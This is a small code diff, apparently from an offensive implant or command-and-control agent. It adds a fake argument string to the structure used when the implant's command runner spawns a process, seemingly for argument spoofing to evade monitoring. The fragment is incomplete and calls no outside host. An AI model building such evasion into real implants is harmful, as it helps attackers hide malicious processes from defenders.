@@ -187,6 +187,11 @@ FUNC VOID CmdRun(
     HANDLE   ProcessHandle = NULL;
     HANDLE   ThreadHandle  = NULL;
     BOOL     bCheck        = FALSE;
+    
+    PWSTR Fake = L"fake argue";
+
+    Blackout().Fork.Argue = bkHeapAlloc( StringLengthW( Fake ) * 2 + 1 );
+    MmCopy( Blackout().Fork.Argue, Fake, StringLengthW( Fake ) * 2 + 1 );
 
     bCheck = bkProcessCreate( ProcCmd, FALSE, CREATE_NEW_CONSOLE, &ProcessHandle, &ProcessId, &ThreadHandle, &ThreadId );
     if ( !bCheck )
